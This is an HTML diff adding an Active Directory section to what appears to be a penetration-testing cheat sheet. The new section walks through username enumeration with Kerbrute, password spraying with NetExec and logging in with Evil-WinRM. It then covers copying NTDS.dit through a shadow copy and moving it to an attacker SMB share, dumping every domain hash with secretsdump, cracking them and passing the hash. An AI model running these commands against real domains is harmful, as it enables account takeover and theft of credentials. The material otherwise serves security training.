@@ -237,7 +237,7 @@ hydra -C defaults.list &lt;proto&gt;://&lt;ip&gt;</code></pre></div>
             <header class="pc-phase-head">
               <span class="pc-phase-num">03</span>
               <h2 class="pc-phase-title" id="pcphase-winhashes-title">Windows credentials: dump &amp; crack</h2>
-              <p class="pc-phase-blurb">Where Windows keeps credentials, how to dump the SAM hives, LSASS memory and LSA secrets with admin rights, and cracking the NT and DCC2 hashes that come out.</p>
+              <p class="pc-phase-blurb">Where Windows keeps credentials: dump the SAM hives, LSASS memory, Credential Manager vaults and the domain&#39;s NTDS.dit, then crack the NT and DCC2 hashes, or pass them.</p>
             </header>
             <ul class="pc-tree pc-tree-root">
               <li class="pc-node has-kids" id="pcnode-wc-authflow">
@@ -388,6 +388,58 @@ mimikatz # sekurlsa::credman</code></pre></div>
                   <details class="pc-node-box">
                     <summary><span class="pc-node-label">Export the vault (keymgr.dll)</span></summary>
                     <div class="pc-node-body"><p>The GUI route: rundll32 keymgr.dll,KRShowKeyMgr opens the Stored User Names and Passwords window, where a vault exports to a password-protected .crd file (also doable from Control Panel) that imports on another Windows host. The vault and locker folder paths are in the table below.</p><pre class="pc-cmd"><code>rundll32 keymgr.dll,KRShowKeyMgr</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node has-kids" id="pcnode-wc-ntds">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Active Directory: dump NTDS.dit</span></summary>
+                  <div class="pc-node-body"><p>On a domain-joined network the prize is the Domain Controller&#39;s NTDS.dit (%SystemRoot%\NTDS\ntds.dit, &quot;directory information tree&quot;), the Active Directory database holding every domain account&#39;s username and password hash. Capture it, with the SYSTEM hive for the boot key as with the SAM, and the whole domain falls. Getting there: build and validate usernames, guess a password, reach the DC as an admin, then copy and extract the database. These attacks need a foothold on the internal network and are noisy.</p></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node is-console" id="pcnode-ad-usernames">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Build &amp; validate usernames</span></summary>
+                    <div class="pc-node-body"><p>Usernames follow a convention (jdoe, jane.doe, doe.jane), often visible in an email address (jdoe@corp means jdoe) or scraped from the company site and social media. Turn real names into candidates by hand or with username-anarchy, then confirm which actually exist with Kerbrute&#39;s userenum against the DC, so you only spray real accounts. The conventions are in the table below.</p><pre class="pc-cmd"><code>./username-anarchy -i names.txt &gt; usernames.txt
+./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain corp.local usernames.txt</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-ad-brute">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Guess passwords (NetExec)</span></summary>
+                    <div class="pc-node-body"><p>With valid usernames, brute or spray them against the DC over SMB with NetExec. Mind account lockout (not enabled by default in AD, so many environments are exposed to this); every attempt logs Event ID 4776 on the DC, so it is far from quiet.</p><pre class="pc-cmd"><code>netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+netexec smb 10.129.201.57 -u usernames.txt -p &#39;Welcome1&#39; --continue-on-success</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-ad-foothold">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Reach the DC &amp; check rights</span></summary>
+                    <div class="pc-node-body"><p>Log in to the DC with the working credential, Evil-WinRM gives a PowerShell session. Copying NTDS.dit needs local admin (Administrators) or Domain Admin, so check your rights with net localgroup and net user &lt;user&gt; (look for Domain Admins or Administrators in the memberships).</p><pre class="pc-cmd"><code>evil-winrm -i 10.129.201.57 -u bwilliamson -p &#39;P@55w0rd!&#39;
+net localgroup
+net user bwilliamson</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-ad-vss">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Copy NTDS.dit (shadow copy)</span></summary>
+                    <div class="pc-node-body"><p>NTDS.dit is locked while AD runs, so copy it out of a Volume Shadow Copy instead: vssadmin creates a snapshot of C: that can be read live, and you copy ntds.dit from the shadow volume. Grab the SYSTEM hive too, the hashes are encrypted with its boot key and will not decrypt without it.</p><pre class="pc-cmd"><code>vssadmin CREATE SHADOW /For=C:
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
+reg.exe save hklm\system C:\NTDS\SYSTEM</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-ad-extract">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Extract the hashes</span></summary>
+                    <div class="pc-node-body"><p>Move NTDS.dit and SYSTEM to the attack host over an smbserver share, then dump with Impacket&#39;s secretsdump. Faster: skip the manual copy entirely and let NetExec run the whole VSS-and-dump remotely with its ntdsutil module. Either way you get every domain hash, krbtgt and the machine accounts included.</p><pre class="pc-cmd"><code>cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+netexec smb 10.129.201.57 -u bwilliamson -p &#39;P@55w0rd!&#39; -M ntdsutil</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node is-console" id="pcnode-ad-pth">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Crack, or Pass-the-Hash</span></summary>
+                    <div class="pc-node-body"><p>Crack the NT hashes with Hashcat mode 1000. If one will not crack, you can still use it: Pass-the-Hash authenticates with the hash itself over NTLM (username:hash instead of username:password), so an uncracked Administrator hash is still a login. Evil-WinRM takes -H for exactly this; more on PtH in the AD enumeration and attacks material.</p><pre class="pc-cmd"><code>hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
+evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b</code></pre></div>
                   </details>
                 </li></ul>
               </li>
@@ -787,6 +839,31 @@ hashcat -m 1000 ntlm.txt --show</code></pre></div>
               </tbody>
             </table>
             <p class="pc-ref-empty" data-ref-empty="credman-vaults" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-username-conventions" aria-labelledby="pcref-username-conventions-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-username-conventions-title">AD username conventions</h2>
+            <p class="pc-ref-intro">How organisations turn a real name into a username. Knowing the convention (from an email address or a leaked document) means you spray real accounts instead of guessing. Filter by convention.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-username-conventions-q">Filter ad username conventions</label>
+            <input class="tool-input pc-ref-input" id="pcref-username-conventions-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="username-conventions" />
+            <span class="pc-ref-count" data-ref-count="username-conventions" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="username-conventions">
+              <thead><tr><th scope="col">Convention</th><th scope="col">Username (Jane Jill Doe)</th></tr></thead>
+              <tbody>
+                <tr data-search="firstinitiallastname jdoe"><td>firstinitiallastname</td><td><code>jdoe</code></td></tr>
+                <tr data-search="firstinitialmiddleinitiallastname jjdoe"><td>firstinitialmiddleinitiallastname</td><td><code>jjdoe</code></td></tr>
+                <tr data-search="firstnamelastname janedoe"><td>firstnamelastname</td><td><code>janedoe</code></td></tr>
+                <tr data-search="firstname.lastname jane.doe"><td>firstname.lastname</td><td><code>jane.doe</code></td></tr>
+                <tr data-search="lastname.firstname doe.jane"><td>lastname.firstname</td><td><code>doe.jane</code></td></tr>
+                <tr data-search="from email (user@domain) jdoe@corp.local gives jdoe"><td>from email (user@domain)</td><td><code>jdoe@corp.local gives jdoe</code></td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="username-conventions" hidden>No match. Try a format name, a value, or clear the filter.</p>
           </div>
         </section>
         <section class="pc-ref" id="pcref-router-defaults" aria-labelledby="pcref-router-defaults-title">
